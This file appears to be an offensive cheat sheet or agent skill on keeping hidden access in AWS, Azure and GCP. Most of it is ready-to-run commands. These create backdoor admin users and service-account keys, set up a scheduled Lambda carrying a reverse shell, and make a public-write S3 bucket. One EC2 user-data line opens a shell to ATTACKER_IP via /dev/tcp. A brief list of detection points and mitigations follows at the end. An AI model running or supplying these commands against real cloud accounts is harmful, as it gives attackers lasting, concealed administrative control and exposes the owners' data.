---
name: cloud-persistence
description: AWS/Azure/GCP stealth persistence, IAM abuse, serverless backdoors.
---

# Cloud Persistence Techniques

## 1. AWS Persistence

### IAM Backdoor User
```bash
# Create hidden IAM user
aws iam create-user --user-name monitor
aws iam create-access-key --user-name monitor
# Attach admin policy
aws iam attach-user-policy --user-name monitor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Lambda Backdoor
```bash
# Create Lambda function with reverse shell
aws lambda create-function --function-name CloudWatchLogs \
  --runtime python3.9 --handler lambda_function.lambda_handler \
  --role arn:aws:iam::ACCOUNT:role/service-role/role \
  --zip-file fileb://backdoor.zip

# Trigger via CloudWatch event
aws events put-targets --rule "DailyCheck" \
  --targets "Id"="1","Arn"="arn:aws:lambda:REGION:ACCOUNT:function:CloudWatchLogs"
```

### S3 Backdoor
```bash
# Create bucket with public write
aws s3 mb s3://backup-logs-$(date +%s)
aws s3api put-bucket-acl --bucket backup-logs-xxx --acl public-read-write
```

### EC2 User Data
```bash
# Modify instance user data for persistence
aws ec2 modify-instance-attribute --instance-id i-xxx --user-data Value=$(echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64)
```

## 2. Azure Persistence

### Azure AD Backdoor User
```bash
# Create hidden user
az ad user create --display-name "Support" --user-principal-name support@domain.onmicrosoft.com --password Pass123!
# Add to Global Admin role
az ad role assignment create --assignee support@domain.onmicrosoft.com --role "Global Administrator"
```

### Function App Backdoor
```bash
az functionapp create --name backdoor-xxx --resource-group rg \
  --storage-account storage --consumption-plan-location eastus \
  --runtime python
```

## 3. GCP Persistence

### Service Account Key
```bash
# Create service account with broad permissions
gcloud iam service-accounts create attacker --display-name "Service Account"
gcloud iam service-accounts keys create key.json --iam-account attacker@project.iam.gserviceaccount.com
# Grant Editor role
gcloud projects add-iam-policy-binding PROJECT --member="serviceAccount:attacker@project.iam.gserviceaccount.com" --role="roles/editor"
```

### Cloud Function Backdoor
```bash
gcloud functions deploy backdoor --runtime python39 --trigger-http --allow-unauthenticated
```

## 4. Detection

- CloudTrail / Activity Logs for IAM changes
- Monitor Lambda/Function creation
- Alert on privilege escalation (Admin policy attachment)
- Review service account keys periodically

## 5. Mitigations

- Least privilege IAM policies
- MFA on all IAM users
- CloudTrail log monitoring
- Service account key rotation
- SCPs to prevent account creation
